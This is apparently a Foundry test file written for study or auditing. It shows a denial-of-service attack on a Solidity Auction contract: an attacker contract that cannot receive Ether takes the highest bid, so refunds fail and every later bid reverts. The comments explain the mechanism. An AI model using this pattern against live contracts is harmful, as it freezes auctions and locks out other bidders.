// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {Auction} from "src/Auction.sol";
import {AttackAuction} from "src/AttackAuction.sol";

contract AuctionAttackTest is Test {
    Auction auction;
    AttackAuction attackContract;

    address deployAuction = makeAddr("deployAuction");
    address attacker = makeAddr("attacker");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");

    function setUp() public {
        vm.prank(deployAuction);
        auction = new Auction();
        vm.prank(attacker);
        attackContract = new AttackAuction(auction);
    }

    function test_attack_auction_dos() public  {
        // user1 makes a bid for 1 ether and thus will be the lastBidder.
        uint256 user1Bid = 1 ether;
        hoax(user1, 2 ether);
        auction.bid{value: user1Bid}();
        assertEq(user1Bid, auction.highestBid());

        // user2 makes a bid for 2 ether thus will take over the role of lastBidder
        // and user1 is refunded back.
        uint256 user2Bid = 2 ether;
        hoax(user2, 10 ether);
        auction.bid{value: user2Bid}();
        assertEq(user2Bid, auction.highestBid());

        // the attacker calls the contract attack() function and makes a bid with 3 ether
        // The attacker contract will be the new lastBidder and user2 is refunded back.
        uint256 attackerBid = 3 ether;
        hoax(attacker, 10 ether);
        attackContract.attack{value: attackerBid}();
        assertEq(attackerBid, auction.highestBid());

        /*Now, if any other user makes a call to bid() function, the refund to the
        attacker contract will fail. This is because the Attacker contract has not
        implemented the receive() or fallback function to receive ether. Due to this
        any Solidity ether transfer function such as call(), send() or transfer() will
        result in an exception or unexpected revert due to the require() statement,
        stopping the execution.
        */
        uint256 user3Bid = 4 ether;
        hoax(user3, 10 ether);
        vm.expectRevert(bytes("Failed to send Ether"));
        auction.bid{value: user3Bid}();
        assertEq(attackerBid, auction.highestBid());
    }

}